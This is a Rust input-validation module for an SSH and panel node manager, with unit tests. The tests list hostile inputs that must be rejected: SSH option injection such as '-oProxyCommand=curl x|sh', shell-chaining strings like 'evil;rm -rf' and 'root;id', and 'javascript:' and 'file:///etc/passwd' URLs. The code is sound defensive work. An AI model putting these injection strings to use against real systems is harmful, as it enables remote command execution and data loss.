//! Input validation for every externally supplied node field (AI handoff JSON, manual form,
//! legacy `nodes.json`). These values reach `ssh` argv, request URLs and the UI, so anything that
//! could be parsed as a CLI option or smuggle control characters is rejected up front.

use std::net::IpAddr;

const MAX_LABEL_CHARS: usize = 64;
const MAX_URL_LEN: usize = 2048;
const MAX_PATH_LEN: usize = 1024;

/// Accepts an IPv4/IPv6 literal or an RFC 1123 hostname (never starting with `-`).
pub fn host(raw: &str) -> Result<String, String> {
    let trimmed = raw.trim();
    let unbracketed = trimmed
        .strip_prefix('[')
        .and_then(|s| s.strip_suffix(']'))
        .unwrap_or(trimmed);
    if unbracketed.is_empty() {
        return Err("host 不能为空".to_string());
    }
    if unbracketed.parse::<IpAddr>().is_ok() {
        return Ok(unbracketed.to_string());
    }
    let is_hostname = unbracketed.len() <= 253
        && unbracketed.split('.').all(|label| {
            !label.is_empty()
                && label.len() <= 63
                && !label.starts_with('-')
                && !label.ends_with('-')
                && label.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
        });
    if is_hostname {
        Ok(unbracketed.to_ascii_lowercase())
    } else {
        Err(format!("host 格式非法：{unbracketed}"))
    }
}

/// POSIX-portable login name: `[A-Za-z_][A-Za-z0-9_.-]{0,31}` (blocks `-oProxyCommand=` injection).
pub fn ssh_user(raw: &str) -> Result<String, String> {
    let trimmed = raw.trim();
    let mut chars = trimmed.chars();
    let valid = matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && trimmed.len() <= 32
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'));
    if valid {
        Ok(trimmed.to_string())
    } else {
        Err(format!("SSH 用户名非法：{trimmed}"))
    }
}

/// Absolute `http(s)://` URL without whitespace/control characters; trailing `/` is stripped.
pub fn http_url(raw: &str, field: &str) -> Result<String, String> {
    let trimmed = raw.trim().trim_end_matches('/');
    if trimmed.len() > MAX_URL_LEN || trimmed.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return Err(format!("{field} 含非法字符或过长"));
    }
    let parsed = reqwest::Url::parse(trimmed).map_err(|e| format!("{field} 不是合法 URL：{e}"))?;
    if !matches!(parsed.scheme(), "http" | "https") || parsed.host_str().is_none() {
        return Err(format!("{field} 仅支持 http(s):// 地址"));
    }
    Ok(trimmed.to_string())
}

/// Empty / missing values map to `None`; anything else must pass [`http_url`].
pub fn optional_http_url(raw: Option<&str>, field: &str) -> Result<Option<String>, String> {
    match raw.map(str::trim) {
        None | Some("") => Ok(None),
        Some(value) => http_url(value, field).map(Some),
    }
}

/// Local filesystem path (e.g. SSH private key) without control characters.
pub fn file_path(raw: &str) -> Result<String, String> {
    let trimmed = raw.trim();
    if trimmed.len() > MAX_PATH_LEN || trimmed.chars().any(char::is_control) {
        return Err("SSH 私钥路径含非法字符或过长".to_string());
    }
    Ok(trimmed.to_string())
}

/// Display label (name / city / flag / ISP tag): control characters removed, length capped.
pub fn label(raw: &str) -> String {
    raw.chars()
        .filter(|c| !c.is_control())
        .take(MAX_LABEL_CHARS)
        .collect::<String>()
        .trim()
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn host_accepts_ip_and_hostname_rejects_option_injection() {
        assert_eq!(host(" 38.55.142.88 ").as_deref(), Ok("38.55.142.88"));
        assert_eq!(host("[2001:db8::1]").as_deref(), Ok("2001:db8::1"));
        assert_eq!(host("VPS.Example.com").as_deref(), Ok("vps.example.com"));
        for bad in ["", "-oProxyCommand=id", "a b.com", "evil;rm -rf", "x..y", "-lead.com"] {
            assert!(host(bad).is_err(), "should reject {bad:?}");
        }
    }

    #[test]
    fn ssh_user_blocks_argv_injection() {
        assert_eq!(ssh_user("root").as_deref(), Ok("root"));
        assert_eq!(ssh_user("deploy.bot-1").as_deref(), Ok("deploy.bot-1"));
        for bad in ["", "-oProxyCommand=curl x|sh", "root;id", "1root", "a b"] {
            assert!(ssh_user(bad).is_err(), "should reject {bad:?}");
        }
    }

    #[test]
    fn http_url_only_allows_web_schemes() {
        assert_eq!(
            http_url("http://1.2.3.4:2053/base/", "panelUrl").as_deref(),
            Ok("http://1.2.3.4:2053/base")
        );
        for bad in ["javascript:alert(1)", "file:///etc/passwd", "http://", "http://a b", "ftp://x"] {
            assert!(http_url(bad, "panelUrl").is_err(), "should reject {bad:?}");
        }
        assert_eq!(optional_http_url(Some("  "), "subUrl"), Ok(None));
    }

    #[test]
    fn label_strips_control_chars_and_caps_length() {
        assert_eq!(label("🇺🇸 Los\u{0007} Angeles\n"), "🇺🇸 Los Angeles");
        assert_eq!(label(&"x".repeat(200)).chars().count(), MAX_LABEL_CHARS);
    }
}
